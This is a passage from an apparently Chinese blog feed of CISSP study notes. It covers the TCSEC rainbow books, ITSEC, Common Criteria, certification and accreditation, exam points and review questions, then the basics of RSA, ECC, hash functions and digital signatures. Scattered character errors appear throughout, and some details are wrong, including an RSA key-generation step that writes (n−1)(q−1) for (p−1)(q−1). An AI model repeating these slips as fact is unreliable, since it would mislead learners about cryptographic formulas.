密码管理指导原则</td><td>绿皮书</td></tr><tr><td>CSC-STD-003-85</td><td>在特定环境中应用TCSEC的指南</td><td>黄皮书</td></tr><tr><td>NCSC-TG-001</td><td>理解可信系统审计的指南</td><td>褐皮书</td></tr><tr><td>NCSC-TG-002</td><td>可信产品评估：供应商指南</td><td>天蓝皮书</td></tr><tr><td>NCSC-TG-002-85</td><td>PC安全考虑</td><td>浅蓝皮书</td></tr><tr><td>NCSC-TG-003</td><td>理解可信系统中任意访问控制的指南</td><td>氖桶皮书</td></tr><tr><td>NCSC-TG-004</td><td>计算机安全术语词汇表</td><td>浅绿皮书</td></tr><tr><td>NCSC-TG-005</td><td>可信网络解释</td><td>红皮书</td></tr><tr><td>NCSC-TG-004</td><td>理解可信系统中配置管理的指南</td><td>琉珀皮书</td></tr><tr><td>NCSC-TG-006</td><td>理解可信系统中设计文档的指南</td><td>暗红皮书</td></tr><tr><td>NCSC-TG-008</td><td>理解可信系统中可信分发的指南</td><td>浅紫皮书</td></tr><tr><td>NCSC-TG-009</td><td>TCSEC中计算机安全子系统的解释</td><td>威尼斯蓝皮书</td></tr></tbody></table><p>　　随着时代的发展和技术的更新，下面列出的对TCSEC 的主要批评能够解释目前普遍使用更新标准的原因：</p><ul><li>尽管TCSEC重点考虑控制用户对信息的访问，但是并没有控制用户一旦获得访问权限后如何对信息进行处理。在军事和商业应用中，这都是问题。</li><li>考虑到来自于美国国防部，因此可以理解TCSEC标准关注的重点完全在于机密性，该标准认定控制用户访问数据的方式意味着不必关注数据的准确性或完整性。在认为数据的准确性和完整性比机密性更重要的商业环境中，TCSEC不起作用。</li><li>除了自身强调访问控制之外，TCSEC并不仔细处理完全实现安全策略所必需的各种人员、物理和过程化的策略问题或防范措施。此外，TCSEC也不处理影响系统安全性的问题。</li><li>橘皮书本质上并不处理网络连接问题(尽管之后在1987年开发的红皮书能够解决类似问题)。</li></ul><h4 id="8-3-4-ITSEC类别与所需的保证和功能性"><a href="#8-3-4-ITSEC类别与所需的保证和功能性" class="headerlink" title="8.3.4 ITSEC类别与所需的保证和功能性"></a>8.3.4 ITSEC类别与所需的保证和功能性</h4><p>　　ITSEC指导原则使用不同的类别等级来评估系统的功能性和保证。在这种环境下，系统的功能性是针对系统用户的实用价值进行衡量。系统的功能性等级描述了系统基于设计和预期目的执行所需功能的情况。保证等级表示系统以一致的方式正常工作的可靠程度。ITSEC将正在被评估的系统作为评估目标(Target OfEvaluation，TOE)。所有的等级都以两种类别表示为TOE等级。ITSEC使用两个尺度来评定功能性和保证的等级。TCSEC和ITSEC之间的差异十分多样化。下面列出了两个标准之间的一些重要差异：</p><ul><li>尽管TCSEC几乎只关注机密性，但是ITSEC除了机密性之外还关注TCSEC缺少的完整性与可用性，因此覆盖了对于维护完整信息的安全性十分重要的所有三个元素。</li><li>ITSEC并不依赖于TCB的概念，并且不要求系统的安全组件在TCB内是隔离的。</li><li>TCSEC要求任何发生变化的系统都要重新进行评估，这些变化包括操作系统的升级、安装补丁或修复，以及应用程序的升级或变化等; ITSEC在这些变化之后不要求进行新的正式评估，而是只维护评估目标。</li></ul><h4 id="8-3-5-通用准则"><a href="#8-3-5-通用准则" class="headerlink" title="8.3.5 通用准则"></a>8.3.5 通用准则</h4><h5 id="1-通用准则的认可"><a href="#1-通用准则的认可" class="headerlink" title="1. 通用准则的认可"></a>1. 通用准则的认可</h5><p>　　下面列出了CC指导原则的目标：</p><ul><li>增加购买者对己评估和己划分等级的IT产品的安全性的信心。</li><li>消除重复评估(除其他外，如果某个国家、机构或验证组织对特定系统的评定等级和配置遵循CC，那么其他国家、机构或验证组织就不需要进行重复的工作)。</li><li>使安全评估和认证过程更有效益和效率。</li><li>确保IT产品的评估遵循高且一致性标准。</li><li>促进评估，并且增强己评估和己划分等级的IT产品的可用性。</li><li>评估TOE的功能性(也就是系统的功能)和保证(也就是系统的被信任程度)。</li></ul><p>　　通用准则过程基于两个关键元素： 保护轮廓和安全目标。保护轮廓(Protection Profiles，PP)指定被评估产品(TOE)的安全需求和保护，这也是客户考虑的安全要求或”希望达到的标准”。安全目标(Security Targets，ST)指定了供应商在TOE内构建的安全声明。ST被视为己实现的安全措施或供应商”提供的安全目标”。</p><h5 id="2-通用准则的结构"><a href="#2-通用准则的结构" class="headerlink" title="2. 通用准则的结构"></a>2. 通用准则的结构</h5><p>　　CC指导原则被分为下列三部分：</p><ul><li>介绍和一般模型描述(lntroduction and General Model)用于评估IT安全性和指定评估目标时涉及的一般概念与基本模型。对于不熟悉安全评估工作过程的人，或者阅读和解释评估结果时需要寻求帮助的人来说，这部分是非常有用的介绍和说明材料。</li><li>安全功能需求(S巳curity Functional Requirement)描述与安全审计、通信安全、安全性的密码学支持、用户数据保护、身份标识和身份认证、安全管理、TOE安全功能σSF) 、资源利用、系统访问以及可信路径有关的各种功能需求。这部分覆盖CC评估过程中能够预想到的完整安全功能范围，井且还具有解释每个功能区域的额外附录。</li><li>安全保证(Security Assurance)涉及TOE在配置管理、传送和操作、开发、指导文档与生命周期支持领域的保证需求，以及保证测试和脆弱性的评估。这部分覆盖CC评估过程中预想到的安全保证检查和保护轮廓的完整范围，并且还具有与描述如何设计、检查和测试系统的评估保证级别相关的信息。</li></ul><h5 id="3-行业和国际安全实施指南"><a href="#3-行业和国际安全实施指南" class="headerlink" title="3. 行业和国际安全实施指南"></a>3. 行业和国际安全实施指南</h5><p>　　支付卡行业数据安全标准(PCI-DSS)是提高电子支付交易安全要求的集合。这些标准由PCI 安全标准委员会的成员进行制订，这些成员主要来自信用卡银行和金融机构。PCI-DSS 定义了安全管理、策略、手里亨、网络架构、软件设计的要求及其他关键的保护措施。<br>　　国际标准化组织(ISO)是由不同国家标准组织的代表组成的世界性标准组织。国际标准化组织定义了工业和商业设备、软件、协议、管理以及其他的标准，有6 个主要产品： 国际标准、技术报告、技术规范、公开规格、技术勘误表和指南。ISO 标准己被许多行业广泛接受，甚至被采纳为各国政府的要求或法律。</p><h4 id="8-3-6-认证和鉴定"><a href="#8-3-6-认证和鉴定" class="headerlink" title="8.3.6 认证和鉴定"></a>8.3.6 认证和鉴定</h4><p>　　要求系统安全的组织需要通过一种或多种方法来评估系统满足安全要求的幸自支。正式的评估过程被分为两个阶段：认证和鉴定。每个阶段要求的实际步骤取决于组织选择的评估标准。认证和鉴定过程用来评估应用程序的有效性，以及操作系统和硬件的安全性。评估的过程为评价系统在多大程度上达到所期望的安全级别提供了一种衡量方法。因为每个系统的安全级别取决于很多因素，所以在评估过程中必须考虑所有这些因素。</p><ul><li><p>认证<br>认证是对IT系统的技术和非技术安全特性以及其他防护措施的综合评估，这能够支持鉴定过程，从而确定特定设计和实现满足一组指定安全要求的程度。系统认证是对计算机系统的每个部分进行技术性评估，以便评估系统与安全标准是否一致。首<br>先，必须选择评估标准(我们将会在稍后部分探讨可以选择的标准) 。一旦选择使用的标准，就要分析每个系统组件，以确定其是否达到所期望的安全目标。在评估完整个系统之后，可以对结果进行评估，以便决定系统在当前环境中支持的安全级别。系统的环境是认证分析过程的一个关键部分，因此系统的安全性或多或少地依赖于其所处的环境。安全系统与网络连接的方式会改变系统的安全状况。系统周围的物理安全保护措施也会影响整体的安全等级。因此，在认证系统时，必须全面考虑所有的因素。</p></li><li><p>鉴定<br>鉴定是由指定许可机构(Designated Approving Au也ority，DAA)做出的正式声明，它表明准许IT系统使用规定的一组防护措施在可接受的风险级别以特定的安全模式运作。鉴定一旦完成，管理层就可以正式接受被评估系统的总体安全性的适用性。认证和鉴定的过程通常是一个不断重复的过程。在鉴定阶段，请求通过改变系统配置或增加控制来解决安全问题的情况时有发生。需要记住的是，只要更改了配置，就必须重新认证新的配置。同样，当经过一段具体的时间后或进行了任何配置变更后，都必须重新认证系统。安全策略应当明确指出什么样的情况需要进行重新认证。优良的安全策略会列出认证有效的时间以及要求重新开始认证和鉴定过程的任何更改。</p></li><li><p>认证和鉴定系统<br>目前有下列两种政府标准适用于计算系统的认证和鉴定：美国国防部标准是风险管理框架(RMF)和美国国家安全系统委员会策略(CNSSP)。这些过程都分为4个阶段：</p><ul><li><strong>定义</strong> 涉及适当的项目人员分配、关键需求的记录以及指导整个认证和鉴定过程的系统安全许可协议(System Security Authorization Agreement，SSAA)的注册、协商和创建。</li><li><strong>验证</strong> 包括细化SSAA、系统开发活动以及认证分析。</li><li><strong>确认</strong> 包括进一步细化SSAA、集成系统的认证评估、DAA建议的开发以及DAA的鉴定结果。</li><li><strong>后鉴定</strong> 包括维护SSAA、系统操作、变更管理以及遵从性验证。</li></ul></li></ul><h3 id="8-4-理解信息系统的安全功能"><a href="#8-4-理解信息系统的安全功能" class="headerlink" title="8.4 理解信息系统的安全功能"></a>8.4 理解信息系统的安全功能</h3><p>　　信息系统的安全功能包括内存保护、虚拟化、可信平台模块、接口和容错能力。认真评估基础设施的各方面，并确保充分支撑安全是非常重要的。</p><h4 id="8-4-1-内存保护"><a href="#8-4-1-内存保护" class="headerlink" title="8.4.1 内存保护"></a>8.4.1 内存保护</h4><p>　　内存保护是一个核心的安全组件，必须对它进行设计和在操作系统中加以实现。无论程序是否在系统中执行，它都必须被执行。否则将导致不稳定、完整性的违反、拒绝服务以及信息泄露的结果。内存保护被用于防止活动进程与没有专门指派或分配的内存区域进行交互。</p><h4 id="8-4-2-虚拟化"><a href="#8-4-2-虚拟化" class="headerlink" title="8.4.2 虚拟化"></a>8.4.2 虚拟化</h4><p>　　虚拟化技术被用于在单一主机的内存中运行一个或多个操作系统。这种机制允许在任意硬件上虚拟运行任何操作系统，也允许多个操作系统同时工作在相同的硬件上。虚拟化有很多好处，比如能够启动单个服务或需要的服务实例，还能实时扩展，以及能够为特殊的服务运行额外的OS版本。从用户的角度来看，虚拟化的服务器和服务与传统的服务器和服务是没有区别的。此外，损坏、崩溃或毁坏的虚拟系统的恢复通常很快，只需简单使用干净的备份版本替换虚拟系统的主硬盘文件，然后重新启动就可以了。</p><h4 id="8-4-3-可信平台模块"><a href="#8-4-3-可信平台模块" class="headerlink" title="8.4.3 可信平台模块"></a>8.4.3 可信平台模块</h4><p>　　可信平台模块(TPM)既是对主板上加密处理器芯片的描述，同时也是描述实施的通用名称。TPM芯片用于存储和处理加密密钥，从而满足基于硬件支持/实现的硬盘加密系统。当使用基于TPM的全磁盘加密技术时，用户/操作员必须提供一个密码或物理USB令牌设备给计算机用于身份认证，并允许TPM芯片向内存释放硬盘加密密钥。<br>　　硬件安全模块(HSM)用于管理/存储数字加密密钥、加速加密操作、支持更快的数字签名，以及提高身份认证的速度。HSM通常是附加的适配器、外部设备或是TCP/IP网络设备。HSM包括防篡改保护以防止滥用，即便攻击者可以对其进行物理访问。TPM就是一个HSM示例。HSM提供大型(2048位以上)非对称加密计算的加速解决方案，以及密钥存储安全保护。许多认证系统使用HSM来存储证书;ATM和POS终端通常采用专有的HSM;硬件SSL加速器可以包括HSM支持;兼容DNSSEC的DNS服务器使用HSM提供密钥和区域文件存储。</p><h4 id="8-4-4-接口"><a href="#8-4-4-接口" class="headerlink" title="8.4.4 接口"></a>8.4.4 接口</h4><p>　　在应用程序中，使用约束或受限接口的目的是限制用户在基于他们的权限上可以做什么或看到什么。具有全部权限的用户可以访问应用程序的所有功能。有限制权限的用户则被限制访问。应用程序使用不同的方法来限制接口。约束接口的目的是限制或制止授权和未经授权用户的行为。这接口的使用就是Clark-Wilson安全模型的一种实践应用。</p><h4 id="8-4-5-容错"><a href="#8-4-5-容错" class="headerlink" title="8.4.5 容错"></a>8.4.5 容错</h4><p>　　容错能力是指系统遭受故障，但能持续运行的能力。容错是安全设计的一个基本要素，被认为是避免单点故障和实现冗余的部分措施。</p><h3 id="8-5-考试要点"><a href="#8-5-考试要点" class="headerlink" title="8.5 考试要点"></a>8.5 考试要点</h3><ul><li><strong>了解每种访问控制模型的细节</strong> 了解各种访问控制模型及其功能。状态机模型确保主体访问客体的所有实例都是安全的。信息流模型被设计用于阻止非授权的、不安全的或受限的信息流。非干扰模型能够阻止一个主体的动作影响另一个主体的系统状态或动作。Take-Grant模型规定了如何将权限从一个主体传递至另一个主体或者从一个主体传递至一个客体。访问控制矩阵是一个由主体和客体形成的表，这个表规定了每个主体能够在每个客体上执行的动作或功能。Bell-LaPadula主体具有一个许可级别，这个许可级别只允许访问具有相应分类级别的客体。Biba模型能够防止具有较低安全级别的主体对具有较高安全级别的客体进行写操作。Clark-Wilson是一个依赖于审计的完整性模型，能够确保未授权的主体无法访问客体以及被授权的用户能够正确地访问客体。Biba和Clark-Wilson模型实现了完整性。Goguen-Meseguer和Sutherland模型关注于完整性。Graham-Denning模型关注于主体和客体的安全建立和删除。</li><li><strong>了解认证和鉴定的定义</strong> 认证是从技术角度评估计算机系统的每个部分，从而判断是否与安全标准相一致。鉴定是正式验收己认证的配置的过程。</li><li><strong>能够描述开放式系统和封闭式系统</strong> 开放式系统是使用行业标准设计的，一般比较容易与其他的开放式系统进行整合。封闭式系统通常是专有硬件和/或软件，它们的设计规范一般不会公开，并且往往较难与其他系统进行整合。</li><li><strong>知道限制、界限和隔离的含义</strong> 限制是对进程从特定内存地址读取(和写入)数据进行限制。界限是进程在读取或写入数据时不能超越的特定内存地址的范围。隔离是通过使用内存界限而将进程加以限制的一种运行模式。</li><li><strong>能够从访问资源的角度定义客体和主体</strong> 访问的主体是提出访问资源请求的用户或进程。访问请求的客体是用户或进程希望访问的资源。</li><li><strong>了解安全控制的工作原理及功能</strong> 安全控制使用访问规则来限制主体对客体的访问。</li><li><strong>能够列出TCSEC、ITSEC 和通用准则的类别</strong> TCSEC的类别包括己验证保护、强制性保护、自主性保护和最小化保护。概述并比较了TCSEC、ITSEC和CC的相当且适用的等级(需要记住的是，ITSEC中从F7到F10的功能性等级没有对应的TCSEC等级)。</li><li><strong>定义可信计算基(TCB)</strong>  TCB 组合了硬件、软件和控制(形成了实施安全策略的可信基)。</li><li><strong>能够解释安全边界</strong> 安全边界是想象出来的，用于将TCB与系统其余部分分隔的界限。TCB组件与非TCB组件之间的通信使用可信路径。</li><li><strong>知道什么是引用监控器和安全内核</strong> 引用监控器是TCB的逻辑部分，对主体在被授予访问权限之前是否具有使用资源的权限进行确认。安全内核是实现引用监控器功能的TCB组件的集合。</li><li><strong>了解信息系统的安全功能。</strong> 常见的安全功能包括内存保护、虚拟化和可信平台模块(TPM)。</li></ul><h3 id="8-6-复习题"><a href="#8-6-复习题" class="headerlink" title="8.6 复习题"></a>8.6 复习题</h3><ol><li><p>系统认证是什么?<br>A. 正式接受确定的系统配置<br>B. 对计算机系统每部分的技术评估，以评估其是否符合安全标准<br>C. 对制造商目标的功能评估，为了让每个硬件和软件组件都满足集成标准<br>D. 制造商的证明，说明所有组件都被正确安装和配置</p></li><li><p>系统鉴定是什么?<br>A. 正式可接受的系统配置声明<br>B. 为了每个硬件和软件组件都满足集成标准，对制造商目标进行的功能评价<br>C. 证明计算机系统实施安全策略的可接受的测试结果<br>D. 指定两台机器之间的安全通信过程</p></li><li><p>封闭式系统是什么?<br>A. 围绕着最终、封闭或标准设计的系统<br>B. 包括工业标准的系统<br>C. 使用未公布协议的专有系统<br>D. 没有运行Windows的任意主机</p></li><li><p>以下哪一项更好地描述了限制或约束的过程?<br>A. 仅可以在有限的时间下运行的过程<br>B. 仅可以在一天中的某些时间运行的过程<br>C. 仅可以访问某些内存空间的过程<br>D. 对客体控制访问的过程</p></li><li><p>访问客体是什么?<br>A. 用户或进程想要访问的资源<br>B. 可以访问资源的用户或进程<br>C. 有效访问规则的列表<br>D. 有限访问类型的序列</p></li><li><p>安全控制是什么?<br>A. 存储了描述客体特性的安全组件<br>B. 列出所有数据分类类型的文件<br>C. 有效的访问规则列表<br>D. 限制访问客体的机制</p></li><li><p>信息系统安全鉴定的什么类型，是在特定的、独立的位置对应用和系统进行评估?<br>A 系统鉴定<br>B. 站点鉴定<br>C. 应用鉴定<br>D. 类型鉴定</p></li><li><p>TCSEC标准定义了几种主要类型?<br>A. 2<br>B. 3<br>C. 4<br>D. 5</p></li><li><p>可信计算基(TCB)是什么?<br>A. 在网络上支持安全传输的主机<br>B. 操作系统内核和设备驱动程序<br>C. 硬件、软件和控制结合在一起实现安全策略<br>D. 验证安全策略的软件和控制</p></li><li><p>安全边界是什么?<br>A. 围绕系统的物理安全区域的边界<br>B. 把TCB和系统其他部分隔离的假想边界<br>C. 防火墙所在的网络<br>D. 计算机系统的任何连接</p></li><li><p>TCB概念的什么部分验证了在授予每个资源需求权限前的每次访问?<br>A. TCB分区<br>B. 信任库<br>C. 引用监控器<br>D. 安全内核</p></li><li><p>安全模型的最佳定义是什么?<br>A. 安全模型描述了组织必须遵循的策略<br>B. 安全模型提供一个框架来实现安全策略<br>C. 安全模型是计算机系统每部分的技术评估，以评价与它们一致的安全标准<br>D. 安全模型是认证配置正式被接受的过程</p></li><li><p>哪个安全模型建立在状态机模型之上?<br>A. Bell-LaPadula和Take-Grant模型<br>B. Biba和Clark-Wilson模型<br>C. Clark-Wilson和Bell-LaPadula模型<br>D. Bell-LaPadula和Biba模型</p></li><li><p>哪个安全模型关注数据的机密性?<br>A. Bell-LaPadula模型<br>B. Biba模型<br>C. Clark-Wilson模型<br>D. Brewer and Nash模型</p></li><li><p>哪个Bell-LaPadula属性阻止低级别的主体访问高级别的客体?<br>A. (星)安全属性<br>B. 不准向上写属性<br>C. 不准向上读属性<br>D. 不准向下读属性</p></li><li><p>Biba模型的简单属性的含义是什么?<br>A. 向下写<br>B. 向上读<br>C. 不准向上写<br>D. 不准向下读</p></li><li><p>当可信主体违反了Bell-LaPadula模型的星安全属性时，为了把客体写入低级别，什么可行的操作可能会发生?<br>A. 扰动<br>B. 多实例<br>C. 聚合<br>D. 移除分类</p></li><li><p>什么安全方法、机制或模型揭示了一个主体访问多个客体的能力?<br>A. 职责分离<br>B. 访问控制矩阵<br>C. Biba模型<br>D. Clark-Wilson模型</p></li><li><p>什么安全模型拥有在理论上含有名称或标签的功能，但是在解决方案中实现时，需要安全内核的名称或标签?<br>A. Graham-Denning模型<br>B. Deployment模型<br>C. 可信计算基<br>D. Chinese Wall</p></li><li><p>下列哪一项不是Clark-Wilson模型的访问控制关系的一部分?<br>A. 客体<br>B. 接口<br>C. 编程语言<br>D. 主体</p></li></ol>]]></content>
    
    <summary type="html">
    
      本文为cissp中安全模型的原则、设计和功能章节的学习笔记
    
    </summary>
    
      <category term="notes" scheme="https://www.diyz.bid/categories/notes/"/>
    
    
      <category term="cissp" scheme="https://www.diyz.bid/tags/cissp/"/>
    
      <category term="学习笔记" scheme="https://www.diyz.bid/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>cissp学习笔记（7）——PKI和密码学应用</title>
    <link href="https://www.diyz.bid/notes/cissp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%887%EF%BC%89%E2%80%94%E2%80%94PKI%E5%92%8C%E5%AF%86%E7%A0%81%E5%AD%A6%E5%BA%94%E7%94%A8/"/>
    <id>https://www.diyz.bid/notes/cissp学习笔记（7）——PKI和密码学应用/</id>
    <published>2018-09-14T02:10:34.000Z</published>
    <updated>2018-10-11T10:12:52.884Z</updated>
    
    <content type="html"><![CDATA[<p>在本章的考试大纲内容有：<br>安全工程学</p><ul><li>I. 密码学应用<ul><li>I.2 密码学类型(例如，对称密码学、非对称密码学、椭圆曲线密码学)</li><li>I.3 公钥基础设施(PKI)</li><li>I.4 密钥管理实践</li><li>I.5 数字签名</li><li>I.6 数字版权管理</li><li>I.7 不可否认性</li><li>I.8 完整性(哈希和撤盐)</li><li>I.9 密码分析攻击方法(例如，暴力破解、仅知密文、已知明文)</li></ul></li></ul><h3 id="7-1-非对称密码学"><a href="#7-1-非对称密码学" class="headerlink" title="7.1 非对称密码学"></a>7.1 非对称密码学</h3><h4 id="7-1-1-公钥与私钥"><a href="#7-1-1-公钥与私钥" class="headerlink" title="7.1.1 公钥与私钥"></a>7.1.1 公钥与私钥</h4><p>　　公钥密码系统依赖于为每个密码系统用户分配的一对密钥。每个用户都同时维护一个公钥和一个私钥。对于想与公钥密码系统用户通信的任何人来说，都可以从该用户那里自由获得公钥。第三方拥有的公钥不会将任何脆弱性引入密码系统。另一方面，私钥只供专人使用，这种密钥从不与其他密码系统用户共享。<br><img src="/notes/cissp学习笔记（7）——PKI和密码学应用/非对称密钥密码学.png"><br>　　发送者用接收者的公钥加密明文消息(时，从而产生密文消息(C)。当接收者打开密文消息时，他们使用自己的私钥解密密文，重新生成最初的明文消息。一旦发送者用接收者的公钥加密了消息，那么在不知道接收者的私钥(用于生成消息的公钥/私钥对的另一半)的情况下，没有用户(包括发送者)能够解密这些信息。这就是公钥密码学的优点，即可以使用不安全的通信通道自由共享公钥，并在以前并不认识的用户之间创建安全的通信信道。</p><h4 id="7-1-2-RSA"><a href="#7-1-2-RSA" class="headerlink" title="7.1.2 RSA"></a>7.1.2 RSA</h4><p>　　RSA算法依赖于大质数在因数分解时固有的计算难度。密码系统的每个用户都使用下列步骤描<br>述的算法产生一对公钥和私钥：</p><ul><li>(1) 选择两个大的质数(每个质数大约200位)，用p和q来表示</li><li>(2) 计算出这两个质数的乘积，即n = p * q</li><li>(3) 选择一个满足下列两项要求的数字e：<ul><li>e小于n</li><li>e和(n一1)(q一1)互为质数</li></ul></li><li>(4) 找到一个数d，使得(ed - 1)mod(p - 1)(q - 1) = 0 。</li><li>(5) 把e和n作为公钥分发给所有的密码系统用户，将d作为私钥并保持其秘密性。</li></ul><p>　　如果Alice想把一条加密的消息发送给Bob，那么她会使用如下所示的公式将明文(P)加密为密文(C)，其中密钥产生过程中生成的e是Bob的公钥，n是p和q的乘积：</p><center>c = p^e mod n</center><br>当Bob 收到消息时，他会运用下面这个公式得到明文消息：<br><center>p = c^d mod n</center><h4 id="7-1-3-EI-Gamal"><a href="#7-1-3-EI-Gamal" class="headerlink" title="7.1.3 EI Gamal"></a>7.1.3 EI Gamal</h4><p>　　El Gamal 算法优于RSA 算法的一个主要方面是： 它是公开发布的。然而，EI Gamal 算法也有一个主要缺点，即用此算法加密的任何消息的长度都加倍了。当加密长信息或数据并且要在带宽较窄的通信线路上传输时，这会表现出难以克服的困难。</p><h4 id="7-1-4-椭圆曲线密码系统-ECC"><a href="#7-1-4-椭圆曲线密码系统-ECC" class="headerlink" title="7.1.4 椭圆曲线密码系统(ECC)"></a>7.1.4 椭圆曲线密码系统(ECC)</h4><p>　　使用下面这个方程式可以定义任何椭圆曲线：</p><p><center>y^2 = x^3 + ax + b</center><br>　　在这个方程式中，x、y、a和b都是实数。每个椭圆曲线都有一个对应的椭圆曲线组，这个椭圆曲线组由椭圆曲线上的点和位于无穷大处的点O组成。在同一个椭圆曲线组中的两个点(P和Q)可以用椭圆曲线的加法算法加在一起。这个运算非常简单，如下所示：</p><p><center>P + Q</center><br>　　这个问题可以被扩展以涉及乘法。假设Q是P的倍数，如下所示：</p><p><center>Q = xP</center><br>　　计算机科学家和数学家相信，即使在P和Q己知的情况下，找到像x这样的数也是极其困难的。这个难题被称为椭圆曲线的离制才数问题，也是形成椭圆曲线密码学的基础。人们一般认为，解决这个问题比解决RSA密码系统依赖的质数因数分解问题和Di面e-Hellman与El Gamal应用的标准离散对数问题还要困难。前面的”密钥长度的重要性”通过具体数据阐述了这个问题，也就是1088位的RSA密钥的加密强度相当于160位的椭圆曲线密码系统密钥的加密强度。</p><h3 id="7-2-散列函数"><a href="#7-2-散列函数" class="headerlink" title="7.2 散列函数"></a>7.2 散列函数</h3><p>　　散列函数具有一个非常简单的用途，那就是它们接收一条可能会很长的消息，然后根据消息内容生成唯一的输出值。该值通常被称为消息摘要。消息摘要可以由消息的发送者产生，并连同完整的消息一起传送给接收者，这其中有两个原因： 首先，接收者能够使用相同的散列函数对完整的消息进行重新计算，得出消息摘要。然后，接收者将计算得出的消息摘要与传送过来的消息摘要进行比较，从而确保始发者发送的消息与接收者收到的是同一条消息。如果两个消息摘要不匹配，那么就表明消息在传送的过程中因为某种原因被修改过。其次，消息摘要可以被用于实现数字签名算法。<br>按照RSA安全公司的标准，对密码学散列函数有下列5个基本要求：</p><ul><li>输入值可以是任意长度。</li><li>输出值具有固定的长度。</li><li>散列函数在计算任何输入值时要相对容易。</li><li>散列函数是单向的(意味着在提供输出值时确定输入值是极其困难的)。</li><li>散列函数是不会发生冲突的(意味着找到产生相同散列值的两条消息是极其困难的) 。</li></ul><h4 id="7-2-1-SHA"><a href="#7-2-1-SHA" class="headerlink" title="7.2.1 SHA"></a>7.2.1 SHA</h4><p>　　安全散列算法(SHA)及随后衍生的SHA-l和SHA-2算法是由美国国家标准和技术协会(NIST)开发的政府标准的散列函数，并在正式的政府出版物一一安全散列标准(Secure Hash Standard，SHS)中进行了说明，此标准也被称为联邦信息处理标准(FIPS)180。SHA-l表面上可以接受任意长度的输入数据(事实上，在此算法中输入值的长度的上限大约是2097152TB)，并且生成一个160 位的消息摘要。SHA-l算法处理512位的消息分组。因此，如果消息的长度不是512的倍数，那么SHA算法就会用附加的数据填充消息，直至长度达到512的下一个最高倍数。</p><h4 id="7-2-2-MD2"><a href="#7-2-2-MD2" class="headerlink" title="7.2.2 MD2"></a>7.2.2 MD2</h4><p>　　MD2散列算法由Ronald Rivest(也就是Rivest、Shamir和Adleman中的同一人)于1989年开发，是为8位处理器提供的一种安全散列函数。MD2对消息进行填充，从而使消息的长度成为16字节的倍数。然后，该算法会计算出一个16字节的校验和，并添加到消息的结尾处。最后，通过使用完整的原始消息与添加的校验和共同生成128位的消息摘要。</p><h4 id="7-2-3-MD4"><a href="#7-2-3-MD4" class="headerlink" title="7.2.3 MD4"></a>7.2.3 MD4</h4><p>　　1990年，Rivest增强了其信息摘要的算法，进而支持32位的处理器并提高了安全级别。这种高级的算法被称为MD4。这个增强算法先对消息进行填充，确保消息的长度比512比特的倍数短64比特。例如，一条16比特的消息会用432比特的附加数据进行填充，使之达到448比特，这条消息的长度是比512比特的倍数短64比特。随后，MD4算法对512位的消息分皇岛挂行处理，经过三轮计算，最后的输出结果是一条128比特的消息摘要。</p><h4 id="7-2-4-MD5"><a href="#7-2-4-MD5" class="headerlink" title="7.2.4 MD5"></a>7.2.4 MD5</h4><p>　　1991年，Rivest发布了其消息摘要算法的下一个版本，也就是MD5。这个算法还是处理512位的消息分组，但是使用4轮明显不同的计算生成与MD2和MD4算法一样长度的消息摘要(128位)。MD5与MD4具有同样的填充要求，即消息长度必须比512位的倍数短64位。</p><p>散列算法记忆表：</p><table><thead><tr><th>算法名称</th><th>哈希值的长度(单位为位)</th></tr></thead><tbody><tr><td>HAVAL(MD5变种)</td><td>128、160、192、224和256</td></tr><tr><td>HMAC</td><td>可变</td></tr><tr><td>MD2</td><td>128</td></tr><tr><td>MD4</td><td>128</td></tr><tr><td>MD5</td><td>128</td></tr><tr><td>SHA-1</td><td>160</td></tr><tr><td>SHA-224</td><td>224</td></tr><tr><td>SHA-256</td><td>256</td></tr><tr><td>SHA-384</td><td>384</td></tr><tr><td>SHA-512</td><td>512</td></tr></tbody></table><h3 id="7-3-数字签名"><a href="#7-3-数字签名" class="headerlink" title="7.3 数字签名"></a>7.3 数字签名</h3><p>　　数字签名算法的基础是公钥密码学和散列函数。数字签名过程本身并不提供任何隐私保护。数字签名只是确保满足加密目标中<br>的完整性和不可否认性。数字签名基础结构具有两个明显的目标：</p><ul><li>数字化的签名消息可以向接收方保证： 消息确实来自己声明的发送者，并且实施了不可否认性(也就是说，排除了发送者之后声称消息是伪造的情况)。</li><li>数字化的签名消息可以向接收方保证： 消息在发送方和接收方之间进行传输的过程中不会被改变。这种方法确保消息不会受到恶意的修改(第三方想要修改消息的含义)以及无意识的修改(由通信过程中的故障造成，如电磁干扰) 。</li></ul><h4 id="7-3-1-HMAC"><a href="#7-3-1-HMAC" class="headerlink" title="7.3.1 HMAC"></a>7.3.1 HMAC</h4><p>　　HMAC算法实现了部分的数字签名功能，即保证了消息在传输过程中的完整性，但是不提供不可否认性。通过使用一个共享的密钥，HMAC 可以与任何标准的消息摘要生成算法(如SHA-2)组合在一起。因此，只有知道此密钥的通信双方能够产生或验证数字签名。如果接收方解密消息摘要，但是无法将这个消息摘要与明文消息产生的消息摘要进行成功比较，那么就说明这条消息在传输过程中被更改了。因为HMAC依赖于一个共享的密钥，所以它无法提供任何的不可否认性功能(正如前面提到的)。在不使用加密的消息摘要算法与基于公钥密码学的采用计算方式的昂贵数字签名算法之间，HMAC能够起到折中的作用。</p><h4 id="7-3-2-数字签名标准"><a href="#7-3-2-数字签名标准" class="headerlink" title="7.3.2 数字签名标准"></a>7.3.2 数字签名标准</h4><p>　　在美国联邦信息处理标准(FIPS)186-4中，美国国家标准和技术协会指定了联邦政府可以使用的数字签名算法，该标准也被称为数字签名标准(DSS)。这个文档指定美国联邦政府批准的所有数字签名算法都必须使用SHA-2散列函数。DSS还指定了可以被用于支持数字签名基础结构的加密算法。目前存在下面三种经过批准的标准加密算法：</p><ul><li>数字签名算法(DSA)，在FIPS 186-4中指定。</li><li>RSA算法，在ANSI X9.31中指定。</li><li>椭圆曲线数字签名算法(ECDSA)，在ANSI X9.62中指定。</li></ul><h3 id="7-4-公钥基础设施-PKI"><a href="#7-4-公钥基础设施-PKI" class="headerlink" title="7.4 公钥基础设施(PKI)"></a>7.4 公钥基础设施(PKI)</h3><p>　　公钥加密的主要优点是使原本互不认识的双方之间的通信变得容易。受信任的公钥基础设施(PKI)层次使得这一点成为可能。这种信任允许结合非对称和对称算法以及哈希和数字证书，为我们提供混合加密方式。</p><h4 id="7-4-1-证书"><a href="#7-4-1-证书" class="headerlink" title="7.4.1 证书"></a>7.4.1 证书</h4><p>　　